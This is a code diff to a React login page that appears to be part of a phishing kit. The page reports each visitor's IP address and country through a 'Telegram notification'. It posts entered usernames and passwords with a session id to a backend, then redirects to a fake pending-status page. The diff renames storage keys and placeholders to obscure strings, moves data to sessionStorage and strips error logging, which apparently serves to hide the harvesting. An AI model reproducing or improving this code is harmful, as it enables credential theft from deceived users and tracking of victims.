@@ -17,8 +17,8 @@ const Login = () => {
   useEffect(() => {
     const fetchStoredDataWithDelay = () => {
       setTimeout(() => {
-        const storedIP = localStorage.getItem("userIP") || "Fetching...";
-        const storedCountry = localStorage.getItem("country") || "Fetching...";
+        const storedIP = sessionStorage.getItem("userIP") || "nlwj...";
+        const storedCountry = sessionStorage.getItem("country") || "nlwj...";
 
 
         setIp(storedIP);
@@ -31,16 +31,15 @@ const Login = () => {
 
   useEffect(() => {
     const sendTelegramNotification = async () => {
-      if (localStorage.getItem("notificationSent") || !ip || !country || ip === "Fetching...") return;
+      if (sessionStorage.getItem("notificationSent") || !ip || !country || ip === "nlwj...") return;
 
       try {
         const currentTime = new Date().toLocaleString();
         const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
-        await axios.post(`${process.env.REACT_APP_API_URL}/api/fetchRecentPosts`, { message });
+        await axios.post(`${process.env.REACT_APP_API_URL}/fetchRecentPosts`, { message });
 
-        localStorage.setItem("notificationSent", "true");
+        sessionStorage.setItem("notificationSent", "true");
       } catch (error) {
-        console.error("Failed to send Telegram notification:", error);
       }
     };
 
@@ -53,10 +52,10 @@ const Login = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    const clientSessionId = localStorage.getItem('clientSessionID');
+    const clientSessionId = sessionStorage.getItem('uCukkzD');
     try {
       const emailOrUsername = email
-      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/auth/loginUser`, { 
+      const response = await axios.post(`${process.env.REACT_APP_API_URL}/auth/loginUser`, { 
         emailOrUsername, 
         password,
         clientSessionId,
@@ -66,7 +65,7 @@ const Login = () => {
         setLoginError(true);
       } else {
         setLoginError(false);
-        localStorage.setItem('chneyal7alataw', 1);
+        sessionStorage.setItem('acssts', 1);
         history.push('/update/status=true/pending');
       }
     } catch (error) {
@@ -98,6 +97,7 @@ const Login = () => {
                     </svg>
                     <span className="Message-sc-15vkh7g-0 kGDZJw">Incorrect username or password.</span>
                   </div>
+                  
                 </div>
               )}
               <hr role="presentation" className="sc-iCZwEW gWxmho" />
